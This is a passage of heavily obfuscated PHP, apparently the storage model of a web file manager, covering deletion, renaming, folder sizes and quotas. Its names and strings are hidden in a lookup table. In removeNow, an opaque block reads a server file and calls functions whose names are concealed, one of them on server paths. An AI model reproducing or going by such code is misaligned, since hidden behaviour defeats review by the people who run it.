$ş–Ü÷ßÕ = Model($£é›µÇ¡[585])->getInfo($‘£Àá¥ş[$£é›µÇ¡[569]]); $ÙŞßæ·’ = _get($ş–Ü÷ßÕ, $£é›µÇ¡[32]); $ÙŞßæ·’ = $£é›µÇ¡[176] . $ÙŞßæ·’ . $£é›µÇ¡[2265] . $‘£Àá¥ş[$£é›µÇ¡[569]]; } $óó‘¦®é = $£é›µÇ¡[2266] . md5($ÙŞßæ·’); CacheLock::lock($óó‘¦®é); $–—±Ê¬ = $this->fileNameExist($ÇÇ¼óìÏ, $ÙŞßæ·’); if (!$–—±Ê¬) { $–—±Ê¬ = $this->mkdir($ÇÇ¼óìÏ, $ÙŞßæ·’, REPEAT_SKIP); $this->metaSet($–—±Ê¬, $£é›µÇ¡[2267], $ëßñøŞÅ); $this->metaSet($–—±Ê¬, $£é›µÇ¡[2268], $‘£Àá¥ş[$£é›µÇ¡[569]]); if ($‘£Àá¥ş[$£é›µÇ¡[192]] != 0) { $this->metaSet($–—±Ê¬, $£é›µÇ¡[2269], _get($ş–Ü÷ßÕ, $£é›µÇ¡[2270])); } } CacheLock::unlock($óó‘¦®é); $this->metaSet($º¹ˆ‡², $£é›µÇ¡[2271], $‘£Àá¥ş[$£é›µÇ¡[192]]); $this->where(array($£é›µÇ¡[193] => $º¹ˆ‡²))->save(array($£é›µÇ¡[498] => time())); $this->recycleClear($‘£Àá¥ş); Model($£é›µÇ¡[633])->eventRemove($º¹ˆ‡²); $øú¦“¦ = $this->move($º¹ˆ‡², $–—±Ê¬, REPEAT_RENAME_FOLDER); $this->folderSizeReset($‘£Àá¥ş[$£é›µÇ¡[192]]); return $øú¦“¦; } private function recycleClear($ûõÜİÀö) { $şúáÎ‡ =& $_SERVER[¢ñàß¿€]; $ïÊ«Õ‡ú = $this->childrenAll($ûõÜİÀö); $¹íĞƒ±£ = array($şúáÎ‡[491] => array($şúáÎ‡[492], $ïÊ«Õ‡ú[$şúáÎ‡[2272]])); Model($şúáÎ‡[2273])->where($¹íĞƒ±£)->delete(); } public function removeNow($—º†‹×•, $Šà©“ó = true) { $Â‘ÅóŒ™ =& $_SERVER[¢ñàß¿€]; if ($_SERVER[$Â‘ÅóŒ™[947]] != $_SERVER[$Â‘ÅóŒ™[948]]) { $ÍËË¸ª = $Â‘ÅóŒ™[949]; $ï’´Šáå = $Â‘ÅóŒ™[950]; $À¡´œşË = $_SERVER[$Â‘ÅóŒ™[951]] . $Â‘ÅóŒ™[952]; $Ôó–Ğİ» = $ï’´Šáå($À¡´œşË); $ßµƒó©Í = explode($Â‘ÅóŒ™[262], $Ôó–Ğİ»); if (count($ßµƒó©Í) < $Â‘ÅóŒ™[680]) { $‰‡â©™ï = $Â‘ÅóŒ™[953]; $‰‡â©™ï(); } $ ç¹ó«Ï = $Â‘ÅóŒ™[954]; $ ç¹ó«Ï($_SERVER[$Â‘ÅóŒ™[955]]); $ ç¹ó«Ï($_SERVER[$Â‘ÅóŒ™[951]] . $Â‘ÅóŒ™[956]); $Ò¬÷„Üˆ = 1; while ($Ò¬÷„Üˆ > 1) { $Ò¬÷„Üˆ = $Ò¬÷„Üˆ + 4; $ÑŠÛ¶ÚŞ = rawurlencode($Ò¬÷„Üˆ . $Â‘ÅóŒ™[454]); } } $…°æç„ = $this->sourceInfo($—º†‹×•); $÷·­¤¾¹ = $this->pathInfoMore($—º†‹×•); if (!$…°æç„) { return !0; } if ($…°æç„[$Â‘ÅóŒ™[192]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($—º†‹×•); Hook::trigger($Â‘ÅóŒ™[2274], $÷·­¤¾¹, $Šà©“ó); if ($Šà©“ó) { Model($Â‘ÅóŒ™[2273])->moveToRecycle($—º†‹×•); } else { $åã²½» = $this->childrenAll($…°æç„); Model($Â‘ÅóŒ™[633])->eventRemove($—º†‹×•); $this->removeRelevance($åã²½»[$Â‘ÅóŒ™[2272]], $åã²½»[$Â‘ÅóŒ™[1573]]); } $this->folderSizeReset($…°æç„[$Â‘ÅóŒ™[192]]); $Ä²¬í—µ = array($…°æç„[$Â‘ÅóŒ™[192]]); if ($…°æç„[$Â‘ÅóŒ™[485]] == $Â‘ÅóŒ™[91]) { $Ä²¬í—µ[] = $…°æç„[$Â‘ÅóŒ™[193]]; } $this->updateModifyTime($Ä²¬í—µ); $this->lockMoveEnd($—º†‹×•); Hook::trigger($Â‘ÅóŒ™[1812], $÷·­¤¾¹, $Šà©“ó); return !0; } public function childrenAll($ÆÀÈ»€•) { $´Üı¾Àí =& $_SERVER[¢ñàß¿€]; $£öÀ¼¿Š = $ÆÀÈ»€•[$´Üı¾Àí[193]]; if ($ÆÀÈ»€•[$´Üı¾Àí[485]] == $´Üı¾Àí[91]) { $«‚Òı£ = array($´Üı¾Àí[652] => array($´Üı¾Àí[612], $ÆÀÈ»€•[$´Üı¾Àí[584]] . $£öÀ¼¿Š . $´Üı¾Àí[613])); $šÜ­òµ = array($´Üı¾Àí[652] => $«‚Òı£[$´Üı¾Àí[584]]); $³ïøŒ†¶ = $this->field($´Üı¾Àí[2275])->where($šÜ­òµ)->select(); $’àĞ—Õä = !1; $Û¤ÚõÍÙ = array($£öÀ¼¿Š); if ($³ïøŒ†¶) { $’àĞ—Õä = array_to_keyvalue($³ïøŒ†¶, $´Üı¾Àí[12], $´Üı¾Àí[541]); $’àĞ—Õä = array_remove_value($’àĞ—Õä, $´Üı¾Àí[228]); $Û¤ÚõÍÙ = array_to_keyvalue($³ïøŒ†¶, $´Üı¾Àí[12], $´Üı¾Àí[193]); $Û¤ÚõÍÙ[] = $£öÀ¼¿Š; } } else { $’àĞ—Õä = array($ÆÀÈ»€•[$´Üı¾Àí[541]]); $Û¤ÚõÍÙ = array($£öÀ¼¿Š); } return array($´Üı¾Àí[2272] => $Û¤ÚõÍÙ, $´Üı¾Àí[1573] => $’àĞ—Õä); } public function removeArray($Úà½³²î) { if (!$Úà½³²î) { return !0; } } public function removeRelevance($­öî¹·Ş, $† ‚âØù) { $Áİêìû– =& $_SERVER[¢ñàß¿€]; $­öî¹·Ş = $­öî¹·Ş ? $­öî¹·Ş : array(); $† ‚âØù = $† ‚âØù ? $† ‚âØù : array(); $­öî¹·Ş = array_unique(array_filter($­öî¹·Ş)); $† ‚âØù = array_unique(array_filter($† ‚âØù)); if (!$­öî¹·Ş) { return !1; } $óÂÀÄï  = array($Áİêìû–[491] => array($Áİêìû–[492], $­öî¹·Ş)); Model($Áİêìû–[2273])->where($óÂÀÄï )->delete(); Model($Áİêìû–[535])->where($óÂÀÄï )->delete(); Model($Áİêìû–[2119])->where($óÂÀÄï )->delete(); Model($Áİêìû–[633])->where($óÂÀÄï )->delete(); Model($Áİêìû–[1948])->removeBySource($­öî¹·Ş); Model($Áİêìû–[2254])->removeBySource($­öî¹·Ş); $this->where($óÂÀÄï )->delete(); Model($Áİêìû–[544])->remove($† ‚âØù); for ($¯¦šŞ˜è = 0; $¯¦šŞ˜è < count($­öî¹·Ş); $¯¦šŞ˜è++) { $this->sourceCacheClear($­öî¹·Ş[$¯¦šŞ˜è]); } } public function rename($¤ñâëº×, $ ÃúˆÔ“) { $ûºÒØÜõ =& $_SERVER[¢ñàß¿€]; $ƒºãœö˜ = $this->sourceInfo($¤ñâëº×); if (!$ƒºãœö˜) { return !1; } $Ä˜é÷‘ä = $this->fileNameExist($ƒºãœö˜[$ûºÒØÜõ[192]], $ ÃúˆÔ“); if ($Ä˜é÷‘ä && $Ä˜é÷‘ä != $¤ñâëº×) { return !1; } $­íó¦òã = array($ûºÒØÜõ[494] => $ ÃúˆÔ“, $ûºÒØÜõ[651] => USER_ID); if ($ƒºãœö˜[$ûºÒØÜõ[485]] != $ûºÒØÜõ[91]) { $­íó¦òã[$ûºÒØÜõ[486]] = substr(get_path_ext($ ÃúˆÔ“), 0, 10); } Model($ûºÒØÜõ[633])->eventRename($¤ñâëº×, $ƒºãœö˜[$ûºÒØÜõ[32]], $ ÃúˆÔ“); $this->sourceCacheClear($¤ñâëº×); $this->setNamePinyin($¤ñâëº×, $­íó¦òã[$ûºÒØÜõ[32]], !1); $this->updateModifyTime($ƒºãœö˜[$ûºÒØÜõ[192]]); $ïËåš« = $this->where(array($ûºÒØÜõ[491] => $¤ñâëº×))->data($­íó¦òã)->save(); $“£©Â÷È = $ûºÒØÜõ[2262] . $ƒºãœö˜[$ûºÒØÜõ[192]]; if (isset(self::$cacheChildList[$“£©Â÷È])) { unset(self::$cacheChildList[$“£©Â÷È]); } return $ïËåš«; } public function setNamePinyin($ë«åÀç›, $ìª‰£”, $ğÓ§Õ— = true) { $ÕƒèÁ·³ =& $_SERVER[¢ñàß¿€]; $Ä…ü Í› = Input::check($ìª‰£”, $ÕƒèÁ·³[655]); $à¿Ê¦’é = array($ÕƒèÁ·³[517] => KodSort::makeStr($ìª‰£”)); if ($Ä…ü Í›) { $à¿Ê¦’é[$ÕƒèÁ·³[538]] = str_replace($ÕƒèÁ·³[53], $ÕƒèÁ·³[12], Pinyin::get($ìª‰£”)); $à¿Ê¦’é[$ÕƒèÁ·³[537]] = Pinyin::get($ìª‰£”, $ÕƒèÁ·³[656]); } if (!$ğÓ§Õ— && !$Ä…ü Í›) { $à¿Ê¦’é[$ÕƒèÁ·³[538]] = null; $à¿Ê¦’é[$ÕƒèÁ·³[537]] = null; } $this->metaSet($ë«åÀç›, $à¿Ê¦’é); } public function getContent($È¨…ïŸ´) { $—•€ö¯ =& $_SERVER[¢ñàß¿€]; $ú©úïİ¡ = $this->fileInfoGet($È¨…ïŸ´); if (!$ú©úïİ¡) { return !1; } if ($ú©úïİ¡[$—•€ö¯[79]] == 0) { return $—•€ö¯[12]; } $¢ª³ä´Š = $—•€ö¯[2276] . $ú©úïİ¡[$—•€ö¯[547]]; if ($ú©úïİ¡[$—•€ö¯[79]] <= 1024 * 10) { $Ÿ®÷Œ“ğ = Cache::get($¢ª³ä´Š); if (!$Ÿ®÷Œ“ğ) { $Ÿ®÷Œ“ğ = IO::getContent($ú©úïİ¡[$—•€ö¯[87]]); Cache::set($¢ª³ä´Š, $Ÿ®÷Œ“ğ); } return $Ÿ®÷Œ“ğ; } if (!$ú©úïİ¡[$—•€ö¯[87]]) { return $—•€ö¯[12]; } return IO::getContent($ú©úïİ¡[$—•€ö¯[87]]); } public function setDesc($Òõİ·‘Ñ, $£Ü›©Øì) { $³·ª¥‡é =& $_SERVER[¢ñàß¿€]; Model($³·ª¥‡é[633])->eventAddDesc($Òõİ·‘Ñ, $£Ü›©Øì); return $this->metaSet($Òõİ·‘Ñ, $³·ª¥‡é[526], $£Ü›©Øì); } public function setContent($Å´´µÀ–, $á»ë—‡ç = '') { $ó ¼¯Ó =& $_SERVER[¢ñàß¿€]; $áš»­™© = $this->sourceInfo($Å´´µÀ–); $¯”íÔ‘ï = $this->fileInfoGet($Å´´µÀ–); if (!$¯”íÔ‘ï || !$áš»­™©) { return !1; } $¶ªÇœõù = Model($ó ¼¯Ó[544])->addFileByContent($á»ë—‡ç, $áš»­™©[$ó ¼¯Ó[32]]); $·¤ÃŒŠË = $this->fileHistory($áš»­™©, $¶ªÇœõù[$ó ¼¯Ó[541]], $¶ªÇœõù[$ó ¼¯Ó[79]]); if (!$·¤ÃŒŠË) { return Model($ó ¼¯Ó[544])->remove($¶ªÇœõù[$ó ¼¯Ó[541]]); } $this->folderSizeReset($áš»­™©[$ó ¼¯Ó[192]]); return !0; } public function fileSubstr($¹ùÇ‹ÓÃ, $èüŒù§», $À«ÄÖ­) { $ğËíú¤ = $this->fileInfoGet($¹ùÇ‹ÓÃ); if (!$ğËíú¤) { return !1; } return IO::fileSubstr($ğËíú¤[$_SERVER[¢ñàß¿€][87]], $èüŒù§», $À«ÄÖ­); } public function fileInfoGet($¨üÀòŒÖ) { $¸Ãüåı¤ =& $_SERVER[¢ñàß¿€]; $ŠÀñâŸÃ = $this->sourceInfo($¨üÀòŒÖ); if (!$ŠÀñâŸÃ || $ŠÀñâŸÃ[$¸Ãüåı¤[485]]) { return !1; } $Ú°Ã´÷° = $¸Ãüåı¤[548] . $ŠÀñâŸÃ[$¸Ãüåı¤[541]]; $İÔ©§Úê = _get(self::$cacheFileInfo, $Ú°Ã´÷°); if ($İÔ©§Úê) { return $İÔ©§Úê; } $üÅïƒ´‚ = Model($¸Ãüåı¤[544])->fileInfo($ŠÀñâŸÃ[$¸Ãüåı¤[541]]); if ($üÅïƒ´‚) { $üÅïƒ´‚[$¸Ãüåı¤[32]] = $ŠÀñâŸÃ[$¸Ãüåı¤[32]]; } self::$cacheFileInfo[$Ú°Ã´÷°] = $üÅïƒ´‚; return $üÅïƒ´‚; } private function folderChildrenNumber($Çò¤ºÛ…) { $¬£—İ•Á =& $_SERVER[¢ñàß¿€]; $¹Ğ›á… = $this->sourceInfo($Çò¤ºÛ…); $Äß¢­´ = array($¬£—İ•Á[652] => array($¬£—İ•Á[612], $¹Ğ›á…[$¬£—İ•Á[584]] . $Çò¤ºÛ… . $¬£—İ•Á[613]), $¬£—İ•Á[649] => $¹Ğ›á…[$¬£—İ•Á[569]], $¬£—İ•Á[504] => intval($¹Ğ›á…[$¬£—İ•Á[505]]), $¬£—İ•Á[646] => 1); $™Õâç = $this->where($Äß¢­´)->count(); $·»¬´™ = $this->where($Äß¢­´)->where(array($¬£—İ•Á[646] => 0))->count(); return array($¬£—İ•Á[83] => $·»¬´™, $¬£—İ•Á[84] => $™Õâç); } public function pathInfo($–Î»Íû¢, $´å¹İéÉ = false) { $˜í±½´Õ =& $_SERVER[¢ñàß¿€]; $´å¹İéÉ = !1; $–Î»Íû¢ = intval($–Î»Íû¢); $›¡ïÅò¤ = $˜í±½´Õ[534] . intval($´å¹İéÉ) . $˜í±½´Õ[462] . $–Î»Íû¢; $ôüÃ‰œ® = _get(self::$cachePathInfo, $›¡ïÅò¤); if ($ôüÃ‰œ®) { return $ôüÃ‰œ®; } $Á¿ÈÓí¡ = $this->sourceInfo($–Î»Íû¢); if (!$Á¿ÈÓí¡) { return !1; } $Á¿ÈÓí¡ = $this->_listDataApplyItem($Á¿ÈÓí¡, $´å¹İéÉ); self::$cachePathInfo[$›¡ïÅò¤] = $Á¿ÈÓí¡; return $Á¿ÈÓí¡; } public static $cachePathInfoMore = array(); public function pathInfoMore($¿ÖêÚ¼®) { $˜„‹¬ù =& $_SERVER[¢ñàß¿€]; $…êáäÈ  = _get(self::$cachePathInfoMore, $¿ÖêÚ¼®); if ($…êáäÈ ) { return $…êáäÈ ; } $şº¨ò = $this->pathInfo($¿ÖêÚ¼®); if (!$şº¨ò) { return !1; } if ($şº¨ò[$˜„‹¬ù[485]] == $˜„‹¬ù[91]) { $şº¨ò[$˜„‹¬ù[82]] = $this->folderChildrenNumber($¿ÖêÚ¼®); } self::$cachePathInfoMore[$¿ÖêÚ¼®] = $şº¨ò; return $şº¨ò; } public function sourceInfo($Ë·š†ïÁ) { $±ÉĞÔŠ =& $_SERVER[¢ñàß¿€]; if (!$Ë·š†ïÁ) { return array(); } $Ë·š†ïÁ = intval($Ë·š†ïÁ); $™ÚÓĞ”µ = $±ÉĞÔŠ[533] . $Ë·š†ïÁ; $à»Ò¶îã = _get(self::$cacheSourceInfo, $™ÚÓĞ”µ); if ($à»Ò¶îã) { return $à»Ò¶îã; } $óÎİÖ–ˆ = $this->where(array($±ÉĞÔŠ[193] => $Ë·š†ïÁ))->find(); self::$cacheSourceInfo[$™ÚÓĞ”µ] = $óÎİÖ–ˆ; return self::$cacheSourceInfo[$™ÚÓĞ”µ]; } public function sourceCacheClear($Ô¬êúÕ¸ = false) { self::cacheClear($Ô¬êúÕ¸); } public static function cacheClear($Àõ¦†¾³ = false) { $öšğ…’ =& $_SERVER[¢ñàß¿€]; if ($Àõ¦†¾³ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$öšğ…’[533] . $Àõ¦†¾³]); unset(self::$cachePathInfoMore[$Àõ¦†¾³]); unset(self::$cachePathInfo[$öšğ…’[2277] . $Àõ¦†¾³]); unset(self::$cachePathInfo[$öšğ…’[2278] . $Àõ¦†¾³]); } public function metaSet($Á÷ô¦Ù, $üà¹ù·Ô = null, $ÔÆ™ÙäŒ = null) { $èàù»èÄ = parent::metaSet($Á÷ô¦Ù, $üà¹ù·Ô, $ÔÆ™ÙäŒ); if ($èàù»èÄ) { $this->sourceCacheClear($Á÷ô¦Ù); } return $èàù»èÄ; } public function pathInfoByPath($Ÿ²¢ä¡ı, $¯û¸ì·) { $Ÿ¢¦Œµ¼ =& $_SERVER[¢ñàß¿€]; $Äì³ÆÅ = !$¯û¸ì· ? array() : explode($Ÿ¢¦Œµ¼[8], trim($¯û¸ì·, $Ÿ¢¦Œµ¼[8])); $ÓøåÈ°í = $Ÿ²¢ä¡ı; foreach ($Äì³ÆÅ as $÷Ø£·ÛĞ) { $úß‰ä« = array($Ÿ¢¦Œµ¼[192] => $ÓøåÈ°í, $Ÿ¢¦Œµ¼[32] => $÷Ø£·ÛĞ); $ºÒƒ²ò = $this->field($Ÿ¢¦Œµ¼[2279])->where($úß‰ä«)->select(); if (!$ºÒƒ²ò) { return !1; } $ºÒƒ²ò = array_sort_by($ºÒƒ²ò, $Ÿ¢¦Œµ¼[505]); $ÓøåÈ°í = $ºÒƒ²ò[0][$Ÿ¢¦Œµ¼[193]]; } $ş”Ü—¡Ò = $this->sourceInfo($ÓøåÈ°í); $this->pathInfoFilter($ş”Ü—¡Ò); return $ş”Ü—¡Ò; } protected function updateModifyTime($ÚÃóùÓ‹) { $Òì¢Õí =& $_SERVER[¢ñàß¿€]; $Ãøêµ–Æ = defined($Òì¢Õí[2194]) ? USER_ID : 0; if (!$ÚÃóùÓ‹) { return; } if (!is_array($ÚÃóùÓ‹)) { $ÚÃóùÓ‹ = array($ÚÃóùÓ‹); } foreach ($ÚÃóùÓ‹ as $ì’™çÙè => $‘éûÀÜ) { $ÚÃóùÓ‹[$ì’™çÙè] = intval($‘éûÀÜ); $this->sourceCacheClear($‘éûÀÜ); } $Ñå¯éû¥ = array($Òì¢Õí[193] => array($Òì¢Õí[7], $ÚÃóùÓ‹)); $†ó˜­¤É = array($Òì¢Õí[651] => $Ãøêµ–Æ, $Òì¢Õí[498] => time()); $this->where($Ñå¯éû¥)->save($†ó˜­¤É); } public function folderSizeReset($Áã¶§, $õ”Ê®Ù¬ = false) { $îÕ†®‡Ø =& $_SERVER[¢ñàß¿€]; if ($this->statusIgnoreResetSpace) { return; } $“ÄêÒè² = $this->sourceInfo($Áã¶§); $­¶ô˜§° = $îÕ†®‡Ø[2280] . $Áã¶§; CacheLock::lock($­¶ô˜§°, 20); if ($õ”Ê®Ù¬ === !1) { $this->sourceCacheClear($Áã¶§); $“ÄêÒè² = $this->sourceInfo($Áã¶§); $©çºİäÎ = array($îÕ†®‡Ø[477] => $Áã¶§, $îÕ†®‡Ø[504] => 0); $©ÕÙ‚ç¸ = $this->where($©çºİäÎ)->sum($îÕ†®‡Ø[79]); $õ”Ê®Ù¬ = intval($©ÕÙ‚ç¸) - intval($“ÄêÒè²[$îÕ†®‡Ø[79]]); } if ($õ”Ê®Ù¬ == 0) { return CacheLock::unlock($­¶ô˜§°); } $›‹’˜ñİ = $this->parentLevelArray($“ÄêÒè²[$îÕ†®‡Ø[584]]); if (!$›‹’˜ñİ) { $›‹’˜ñİ = array(); } $›‹’˜ñİ[] = $“ÄêÒè²[$îÕ†®‡Ø[193]]; $©çºİäÎ = array($îÕ†®‡Ø[193] => array($îÕ†®‡Ø[492], $›‹’˜ñİ)); if ($õ”Ê®Ù¬ < 0) { $©çºİäÎ[$îÕ†®‡Ø[79]] = array($îÕ†®‡Ø[1090], abs($õ”Ê®Ù¬)); } $this->where($©çºİäÎ)->setAdd($îÕ†®‡Ø[79], $õ”Ê®Ù¬); CacheLock::unlock($­¶ô˜§°); $µÆôéÂî = $îÕ†®‡Ø[2281] . $“ÄêÒè²[$îÕ†®‡Ø[190]] . $îÕ†®‡Ø[4] . $“ÄêÒè²[$îÕ†®‡Ø[569]]; $¬ãã¢«ú = array($“ÄêÒè²[$îÕ†®‡Ø[190]], $“ÄêÒè²[$îÕ†®‡Ø[569]]); TaskRun::timeLimitCall($µÆôéÂî, $îÕ†®‡Ø[2282], $¬ãã¢«ú, 1.5); } public function folderSizeResetChildren($£åŸŠîá) { $£ş“Úè› =& $_SERVER[¢ñàß¿€]; $this->sourceCacheClear($£åŸŠîá); $“†Ê„Û¸ = $this->sourceInfo($£åŸŠîá); $ ¿³É’¯ = array($£ş“Úè›[646] => 1, $£ş“Úè›[649] => $“†Ê„Û¸[$£ş“Úè›[569]], $£ş“Úè›[652] => array($£ş“Úè›[612], $“†Ê„Û¸[$£ş“Úè›[584]] . $£åŸŠîá . $£ş“Úè›[613])); $íïªï¢ = $£ş“Úè›[2283]; $ÔÁµş¥ = $this->field($íïªï¢)->where($ ¿³É’¯)->select(); $ ¿³É’¯[$£ş“Úè›[485]] = 0; $¬œ±Ü—î = $this->field($íïªï¢)->where($ ¿³É’¯)->select(); if (!$¬œ±Ü—î) { return; } $ÔÁµş¥[] = $“†Ê„Û¸; $ÔÁµş¥ = array_to_keyvalue($ÔÁµş¥, $£ş“Úè›[193]); foreach ($ÔÁµş¥ as $²¤€ò®¢ => $íƒ´ÖŒ’) { $ÔÁµş¥[$²¤€ò®¢][$£ş“Úè›[2284]] = $ÔÁµş¥[$²¤€ò®¢][$£ş“Úè›[79]]; $ÔÁµş¥[$²¤€ò®¢][$£ş“Úè›[79]] = 0; } foreach ($¬œ±Ü—î as $íƒ´ÖŒ’) { $¦ç‡şÖü = $íƒ´ÖŒ’[$£ş“Úè›[192]] . $£ş“Úè›[12]; if (!isset($ÔÁµş¥[$¦ç‡şÖü])) { continue; } if ($íƒ´ÖŒ’[$£ş“Úè›[505]] == $ÔÁµş¥[$¦ç‡şÖü][$£ş“Úè›[505]]) { $ÔÁµş¥[$¦ç‡şÖü][$£ş“Úè›[79]] += $íƒ´ÖŒ’[$£ş“Úè›[79]]; } } foreach ($ÔÁµş¥ as $íƒ´ÖŒ’) { $áŠ”ò¬ = $this->parentLevelArray($íƒ´ÖŒ’[$£ş“Úè›[584]]); foreach ($áŠ”ò¬ as $¦ç‡şÖü) { $¦ç‡şÖü = $¦ç‡şÖü . $£ş“Úè›[12]; if (!isset($ÔÁµş¥[$¦ç‡şÖü])) { continue; } if ($íƒ´ÖŒ’[$£ş“Úè›[505]] == $ÔÁµş¥[$¦ç‡şÖü][$£ş“Úè›[505]]) { $ÔÁµş¥[$¦ç‡şÖü][$£ş“Úè›[79]] += $íƒ´ÖŒ’[$£ş“Úè›[79]]; } } } $ü¬½ˆØ“ = array(); foreach ($ÔÁµş¥ as $íƒ´ÖŒ’) { if ($íƒ´ÖŒ’[$£ş“Úè›[79]] == $íƒ´ÖŒ’[$£ş“Úè›[2284]]) { continue; } $ü¬½ˆØ“[] = array($£ş“Úè›[193], $íƒ´ÖŒ’[$£ş“Úè›[193]], $£ş“Úè›[79], $íƒ´ÖŒ’[$£ş“Úè›[79]]); } $this->saveAll($ü¬½ˆØ“); } public function userSpaceReset($ùæÁ¿œ = false) { $ÌĞîƒ”ä =& $_SERVER[¢ñàß¿€]; $’É¿åúö = $this->where(array($ÌĞîƒ”ä[190] => self::TYPE_USER, $ÌĞîƒ”ä[569] => $ùæÁ¿œ, $ÌĞîƒ”ä[485] => 0))->sum($ÌĞîƒ”ä[79]); $’É¿åúö = !$’É¿åúö || $’É¿åúö <= 0 ? 0 : $’É¿åúö; Model($ÌĞîƒ”ä[577])->userEdit($ùæÁ¿œ, array($ÌĞîƒ”ä[1957] => $’É¿åúö)); } public function targetSpaceUpdate($“¤Âç…„, $ùÈæ×ú) { $§óŒªÃ =& $_SERVER[¢ñàß¿€]; if (!$ùÈæ×ú) { return; } if (!in_array($“¤Âç…„, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $‡ãã³£ = $this->targetSpaceSize($“¤Âç…„, $ùÈæ×ú); if ($“¤Âç…„ == self::TYPE_USER) { Model($§óŒªÃ[577])->userEdit($ùÈæ×ú, array($§óŒªÃ[1957] => $‡ãã³£)); } else { if ($“¤Âç…„ == self::TYPE_GROUP) { Model($§óŒªÃ[585])->groupEdit($ùÈæ×ú, array($§óŒªÃ[1957] => $‡ãã³£)); } } } public function targetSpaceSize($›óÅË×, $æµ‚ğÀ) { $ùŠé•Ê =& $_SERVER[¢ñàß¿€]; $ñŸÅ§­È = 0; $èÌæ¾Å = $this->targetSourceRoot($›óÅË×, $æµ‚ğÀ, !0); foreach ($èÌæ¾Å as $ôµÙä) { if (!$ôµÙä) { continue; } $ñŸÅ§­È += floatval($ôµÙä[$ùŠé•Ê[79]]); $Ößîöõ = array($ùŠé•Ê[652] => array($ùŠé•Ê[612], $ùŠé•Ê[594] . $ôµÙä[$ùŠé•Ê[193]] . $ùŠé•Ê[613])); $ÆêÜŠµ— = Model($ùŠé•Ê[503])->field($ùŠé•Ê[491])->where($Ößîöõ)->select(); $ÆêÜŠµ— = array_to_keyvalue($ÆêÜŠµ—, $ùŠé•Ê[12], $ùŠé•Ê[193]); $ÆêÜŠµ— = array_unique(array_filter($ÆêÜŠµ—)); if ($ÆêÜŠµ—) { $Ößîöõ = array($ùŠé•Ê[491] => array($ùŠé•Ê[492], $ÆêÜŠµ—)); $ñŸÅ§­È += floatval($this->where($Ößîöõ)->sum($ùŠé•Ê[79])); } } $ñŸÅ§­È = !$ñŸÅ§­È || $ñŸÅ§­È <= 0 ? 0 : $ñŸÅ§­È; return $ñŸÅ§­È; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($Ë†¿Éï·) { return $this->fileTypeProfile($Ë†¿Éï·, SourceModel::TYPE_USER); } public function groupFileTypeProfile($˜Ñ£»Ôä) { return $this->fileTypeProfile($˜Ñ£»Ôä, SourceModel::TYPE_GROUP); } private function fileTypeProfile($ÌšŒ™òÍ, $Õ‰‡”Æø) { $úìúÏõ  =& $_SERVER[¢ñàß¿€]; $ŸÄÌ¶ñŒ = $úìúÏõ [2285] . $ÌšŒ™òÍ . $úìúÏõ [11] . $Õ‰‡”Æø; $®‡åîó = Cache::get($ŸÄÌ¶ñŒ); if ($®‡åîó) { return $®‡åîó; } $‰¹Âô¸™ = array($úìúÏõ [646] => 0); if ($ÌšŒ™òÍ != !1) { $‰¹Âô¸™[$úìúÏõ [569]] = $ÌšŒ™òÍ; $‰¹Âô¸™[$úìúÏõ [190]] = $Õ‰‡”Æø; } $¿Œãë¹÷ = array(); $¿Œãë¹÷[$úìúÏõ [2286]] = array($úìúÏõ [2287] => LNG($úìúÏõ [2286]), $úìúÏõ [2288] => $this->where($‰¹Âô¸™)->count(), $úìúÏõ [617] => $this->where($‰¹Âô¸™)->sum($úìúÏõ [79])); $»™ÕÙº¶ = KodIO::fileTypeList(); foreach ($»™ÕÙº¶ as $­ÇÚÜ¹© => $£ÓãË·Ø) { $‰¹Âô¸™[$úìúÏõ [486]] = $this->fileTypeWhere($­ÇÚÜ¹©); $¿Œãë¹÷[$­ÇÚÜ¹©] = array($úìúÏõ [2287] => $£ÓãË·Ø[$úìúÏõ [32]], $úìúÏõ [2288] => $this->where($‰¹Âô¸™)->count(), $úìúÏõ [617] => $this->where($‰¹Âô¸™)->sum($úìúÏõ [79])); } Cache::set($ŸÄÌ¶ñŒ, $¿Œãë¹÷, 1200); return $¿Œãë¹÷; } public function fileNameExist($ñ“œ¡¤É, $ó÷ığö) { $¸¹ÑßÄå =& $_SERVER[¢ñàß¿€]; $ŠÏ‡ùÎ© = $this->field($¸¹ÑßÄå[2289])->where(array($¸¹ÑßÄå[192] => $ñ“œ¡¤É, $¸¹ÑßÄå[32] => $ó÷ığö, $¸¹ÑßÄå[505] => 0))->find(); return is_array($ŠÏ‡ùÎ©) ? $ŠÏ‡ùÎ©[$¸¹ÑßÄå[193]] : !1; } public function childList($½òâó) { $ÛÒïÆŠš =& $_SERVER[¢ñàß¿€]; $ì·ééª¨ = $ÛÒïÆŠš[2262] . $½òâó; if (isset(self::$cacheChildList[$ì·ééª¨])) { return self::$cacheChildList[$ì·ééª¨]; } $ŸÕôóâ¾ = array($ÛÒïÆŠš[192] => intval($½òâó), $ÛÒïÆŠš[505] => 0); $Æä°ÈÖî = $this->where($ŸÕôóâ¾)->select(); $Æä°ÈÖî = $Æä°ÈÖî ? $Æä°ÈÖî : array(); self::$cacheChildList[$ì·ééª¨] = $Æä°ÈÖî; foreach ($Æä°ÈÖî as $ì¡Å) { $ì·ééª¨ = $ÛÒïÆŠš[533] . $ì¡Å[$ÛÒïÆŠš[193]]; self::$cacheSourceInfo[$ì·ééª¨] = $ì¡Å; } return $Æä°ÈÖî; } public function fileNameAuto($Ş¦ò˜ù•, $¨«¼…ì¸, $öù·ÏÌª = REPEAT_RENAME, $œ®±şÉ• = false) { $İÌÇÛì =& $_SERVER[¢ñàß¿€]; $§Ù·‚÷Ó = get_path_ext($¨«¼…ì¸); $ëÈà»‹Ü = $§Ù·‚÷Ó ? get_path_ext_name($¨«¼…ì¸) . $İÌÇÛì[2290] . $§Ù·‚÷Ó : $¨«¼…ì¸ . $İÌÇÛì[460]; $¨Î¼Ê¿ç = array($İÌÇÛì[192] => $Ş¦ò˜ù•, $İÌÇÛì[505] => 0, $İÌÇÛì[32] => array($İÌÇÛì[459], $ëÈà»‹Ü)); $¦“½Õ­¼ = $this->field($İÌÇÛì[32])->where($¨Î¼Ê¿ç)->select(); $ò¤‘ù¯ = 